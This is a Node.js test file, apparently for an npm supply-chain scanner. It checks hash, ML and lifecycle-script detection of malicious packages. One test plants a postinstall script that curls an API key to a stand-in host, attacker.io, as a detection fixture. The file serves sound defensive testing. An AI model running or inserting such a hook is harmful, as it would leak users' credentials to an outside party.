import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import { scanLocal } from '../lib/scan-local.js';
import { createTempProject } from './helpers/project-fixture.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

test('scanLocal detects bundled known-malware-hash match', async () => {
  const malicious = await readFile(join(__dirname, 'fixtures/ml/malicious-exfil.js'), 'utf8');
  const project = await createTempProject('hash-match');

  await project.writeJson('package.json', { name: 'hash-test', version: '1.0.0' });
  await project.writeNodeModule('known-evil', { 'index.js': malicious });

  const findings = await scanLocal(project.root, {
    allowPackages: [],
    ignorePaths: [],
    heuristics: { maxFileSizeKb: 512 },
    ml: { enabled: false },
  });

  assert.ok(findings.some((finding) => finding.rule === 'known-malware-hash'));
});

test('scanLocal ML integration flags malicious fixture without layer 1 only', async () => {
  const malicious = await readFile(join(__dirname, 'fixtures/ml/malicious-exfil.js'), 'utf8');
  const project = await createTempProject('ml-integration');

  await project.writeJson('package.json', { name: 'ml-test', version: '1.0.0' });
  await project.writeNodeModule('suspicious-lib', { 'index.js': malicious });

  const findings = await scanLocal(project.root, {
    allowPackages: [],
    ignorePaths: [],
    heuristics: { maxFileSizeKb: 512 },
    ml: { enabled: true, layer2Threshold: 0.5 },
  });

  assert.ok(findings.some((finding) => finding.rule?.startsWith('ml-')));
});

test('scanLocal ML integration approves benign utility fixture', async () => {
  const benign = await readFile(join(__dirname, 'fixtures/ml/benign-date-validator.js'), 'utf8');
  const project = await createTempProject('ml-benign');

  await project.writeJson('package.json', { name: 'benign-test', version: '1.0.0' });
  await project.writeNodeModule('safe-lib', { 'index.js': benign });

  const findings = await scanLocal(project.root, {
    allowPackages: [],
    ignorePaths: [],
    heuristics: { maxFileSizeKb: 512 },
    ml: { enabled: true },
  }, { skipCache: true });

  assert.equal(findings.length, 0);
});

test('scanLocal detects suspicious postinstall script in package.json', async () => {
  const project = await createTempProject('postinstall');

  await project.writeJson('package.json', { name: 'postinstall-test', version: '1.0.0' });
  await project.writeNodeModule('bad-hooks', { 'index.js': 'module.exports = {};' }, {
    scripts: { postinstall: 'curl -d "$API_KEY" https://attacker.io/exfil' },
  });

  const findings = await scanLocal(project.root, {
    allowPackages: [],
    ignorePaths: [],
    heuristics: { maxFileSizeKb: 512 },
    ml: { enabled: false },
  });

  assert.ok(findings.some((finding) => finding.rule === 'suspicious-lifecycle-script'));
});
